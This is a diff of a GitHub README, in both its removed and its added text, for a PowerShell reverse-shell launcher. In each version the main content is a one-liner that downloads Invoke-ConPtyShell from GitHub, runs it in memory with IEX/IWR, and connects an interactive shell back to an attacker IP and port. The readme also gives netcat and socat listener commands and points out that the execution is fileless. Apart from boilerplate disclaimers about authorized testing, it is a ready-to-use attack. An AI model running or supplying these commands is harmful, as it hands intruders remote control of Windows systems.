@@ -1,76 +1,71 @@
-# 🐾 Rogue-Cat
+# Invoke-ConPtyShell Reverse Shell Launcher
 
-<div align="center">
+A lightweight PowerShell one-liner for downloading and executing **Invoke-ConPtyShell** to establish a fully interactive reverse shell using Windows ConPTY.
 
-[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue.svg)](https://github.com/PowerShell/PowerShell)
-[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
-[![Type](https://img.shields.io/badge/Type-Interactive%20Reverse%20Shell-red.svg)](https://github.com/infinite667/Rogue-Cat)
-
-*An interactive Windows Pseudo Console (ConPTY) reverse shell payload runner leveraging fileless execution.*
-
-</div>
+> **For authorized security testing and lab environments only.**
 
 ---
 
-## 📖 Table of Contents
-- [Overview](#-overview)
-- [The Payload](#-the-payload)
-- [How It Works](#-how-it-works)
-- [Prerequisites](#-prerequisites)
-- [Usage](#-usage)
-- [Disclaimer](#-disclaimer)
-- [License](#-license)
+## Features
+
+* Fully interactive PowerShell reverse shell
+* Uses Windows ConPTY for improved terminal support
+* Single-line execution
+* No local file required
+* Useful for penetration testing labs and red team simulations
 
 ---
 
-## 🚀 Overview
+## Usage
 
-**Rogue-Cat** is a streamlined repository hosting an advanced PowerShell-based reverse shell payload. It utilizes **ConPtyShell** (`Invoke-ConPtyShell.ps1`) by `antonioCoco` to spawn a fully interactive Windows Pseudo Console (`ConPTY`) over a network socket, avoiding the limitations of legacy reverse shells.
-
----
-
-## ⚡ The Payload
-
-Copy and run the following command in a PowerShell session on the target Windows system:
+Replace the IP address and port with your listener.
 
 ```powershell
-IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
-⚙️ How It Works
-[Target Windows System]                                      [Listener Machine]
-  │                                                                │
-  ├─ 1. IWR fetches Invoke-ConPtyShell.ps1 from GitHub             │
-  ├─ 2. IEX executes script in-memory (Fileless)                   │
-  └─ 3. Invoke-ConPtyShell opens ConPTY ────────────── (TCP) ──────► Listens on 192.168.178.118:33413
-IWR (Invoke-WebRequest): Fetches the PowerShell script directly from GitHub using basic parsing for broad compatibility.
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER_IP> <PORT>
+```
 
-IEX (Invoke-Expression): Executes the script completely in-memory without writing any files to the target disk.
+### Example
 
-Invoke-ConPtyShell: Spawns a native Windows ConPTY instance and routes it back to the listener IP (192.168.178.118) on port (33413).
+```powershell
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
+```
 
-📋 Prerequisites
-Windows target machine with PowerShell enabled.
+---
 
-Network routing/connectivity to the listener IP.
+## Listener
 
-A raw socket listener set up on your machine.
+Start a listener before executing the command.
 
-💻 Usage
-⚠️ Warning: This tool and script are intended strictly for educational purposes, authorized penetration testing, and CTF challenges.
+Example using Stty and Netcat:
 
-Step 1: Set up a Listener
-Run a raw socket handler on your machine (using socat for full terminal dimension and raw character support):
+```bash
+stty raw -echo; (stty size; cat) | nc -lvnp 33413
+```
 
-Bash
-socat file:`tty`,raw,echo=0 tcp-listen:33413
-(Alternatively, a standard netcat listener like nc -lvnp 33413 can be used, though terminal resizing features will be limited).
+---
 
-Step 2: Run the Payload
-Execute the payload on the target Windows environment via PowerShell:
+## Requirements
 
-PowerShell
-IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
-⚖️ Disclaimer
-The author and contributors assume no liability and are not responsible for any misuse or damage caused by this program. Use only on systems you own or have explicit, written legal permission to test.
+* Windows 10 / Windows Server with ConPTY support
+* PowerShell
+* Network connectivity to the listener
+* Appropriate authorization to perform security testing
 
-📝 License
-Distributed under the MIT License. See LICENSE for more information.
+---
+
+## Credits
+
+* Original **Invoke-ConPtyShell** project by Antonio Coco:
+  https://github.com/antonioCoco/ConPtyShell
+
+---
+
+## Disclaimer
+
+This project is intended solely for authorized security assessments, penetration testing, educational use, and laboratory environments. Do not use it against systems or networks without explicit permission. The author assumes no responsibility for misuse or damage resulting from the use of this project.
+
+---
+
+## License
+
+This repository is provided for educational purposes. Please refer to the original project's license and terms of use where applicable.
